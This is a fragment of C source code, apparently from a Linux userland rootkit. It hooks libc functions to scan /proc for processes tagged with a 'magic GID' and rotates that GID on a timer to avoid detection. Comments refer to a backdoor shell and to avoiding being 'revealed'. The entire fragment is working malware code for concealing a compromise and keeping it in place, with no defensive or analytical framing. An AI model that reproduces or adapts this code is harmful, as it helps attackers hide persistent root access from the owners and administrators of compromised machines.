int rkprocup(void){      // determines whether or not rootkit processes are alive.
    int status = 0;      // we don't change magic GID if rootkit processes are up.
    struct dirent *dir;  // otherwise there's a possibility of being revealed...
    DIR *dp;
    struct stat procstat;
    gid_t magicgid = readgid();

    hook(COPENDIR, CREADDIR, C__XSTAT);

    dp = call(COPENDIR, "/proc");
    if(dp == NULL) return 0;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "..\0"))
            continue;

        char procpath[7+strlen(dir->d_name)];
        snprintf(procpath, sizeof(procpath), "/proc/%s", dir->d_name);
        memset(&procstat, 0, sizeof(struct stat));

        if((long)call(C__XSTAT, _STAT_VER, procpath, &procstat) < 0)
            continue;

        if(procstat.st_gid == magicgid){
            status = 1;
            break;
        }
    }

    closedir(dp);
    return status;
}

FILE *opengidtimepath(const char *mode){
    hook(CFOPEN);
    return call(CFOPEN, GIDTIME_PATH, mode);
}

int getlastchange(void){  // returns the time since the last change.
    int currentlast;
    FILE *fp;
    char timbuf[64];

    fp = opengidtimepath("r");
    if(fp == NULL){
        writelastchange(time(NULL));
        return getlastchange();
    }
    fgets(timbuf, sizeof(timbuf), fp);
    fclose(fp);

    currentlast = atoi(timbuf);
    return currentlast;
}

void writelastchange(int curtime){  // writes the *new* last change.
    FILE *fp;
    char timbuf[64];

    fp = opengidtimepath("w");
    if(fp == NULL) return;

    snprintf(timbuf, sizeof(timbuf), "%d", curtime);
    fwrite(timbuf, 1, strlen(timbuf), fp);
    fclose(fp);
}

int getlastchangediff(int curtime){  // returns the difference between the system's current time & time since last gid change.
    int lastchange = getlastchange();
    int diff = curtime - lastchange;
    return diff;
}

void gidchanger(void){  // changes the gid if the time since last change is >GID_CHANGE_MINTIME.
    gid_t magicgid = readgid();

    // this function isn't intended to be run from backdoor shell.
    // or while rootkit processes are still active.
    if(getgid() == magicgid || not_user(0) || rkprocup())
        return;

    int curtime = time(NULL);
    // only try to change gid after GID_CHANGE_MINTIME seconds
    if(getlastchangediff(curtime) <= GID_CHANGE_MINTIME)
        return;

    if(changerkgid() < 0) return;
    writelastchange(curtime);
}